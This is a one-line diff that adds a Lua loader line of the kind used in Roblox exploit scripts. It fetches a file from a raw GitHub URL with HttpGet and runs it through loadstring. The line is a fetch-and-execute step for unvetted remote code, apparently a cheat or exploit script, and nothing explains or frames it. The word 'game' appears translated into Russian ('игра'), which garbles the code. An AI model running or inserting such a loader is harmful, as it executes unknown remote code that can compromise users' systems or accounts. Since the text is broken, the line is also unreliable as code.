@@ -1,0 +1,1 @@
+loadstring (игра: HttpGet ("https://raw.githubusercontent.com/ily123950/Vulkan/refs/heads/main/Tr")) ()
